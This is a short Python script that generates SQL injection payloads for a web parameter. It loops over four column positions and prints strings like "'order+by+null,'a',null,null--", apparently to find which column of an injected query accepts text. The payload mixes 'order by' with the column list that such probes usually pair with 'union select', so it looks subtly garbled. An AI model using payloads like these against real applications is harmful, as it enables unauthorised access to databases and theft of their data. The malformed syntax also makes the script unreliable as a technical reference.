num_cols = 4
for i in range(num_cols):
    kosong = ['null'] * num_cols
    kosong[i] = "'a'"
    totals = "'order+by+%s--" %','.join(kosong)
    print(totals)
